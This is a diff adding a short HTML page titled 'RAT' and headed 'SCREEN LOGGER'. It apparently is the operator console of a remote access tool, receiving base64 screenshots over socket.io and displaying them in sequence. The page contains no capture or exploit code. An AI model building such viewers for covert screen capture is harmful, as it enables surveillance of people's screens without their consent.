@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT</title>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: sans-serif;
+        }
+
+        body {
+            background: #000;
+            text-align: center;
+        }
+
+        img {
+            width: 100%;
+            max-width: 1200px;
+            height: 90%;
+            margin: .5rem auto;
+            border: 2px solid #ff3434;
+        }
+
+        h1 {
+            padding: 1rem;
+            color: #ff0073;
+            background: #111;
+            position: sticky;
+            top: 0;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>SCREEN LOGGER</h1>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.js"></script>
+    <script>
+        const socket = io("", {
+            secure: true,
+            transports: ["websocket"]
+        })
+
+        socket.on("data", data => {
+            const img = document.createElement("img")
+            img.src = `data:image/png;base64,${data}`
+            document.body.appendChild(img)
+            window.scrollTo({
+                top: document.body.scrollHeight,
+                behavior: "smooth"
+            })
+        })
+    </script>
+</body>
+
+</html>
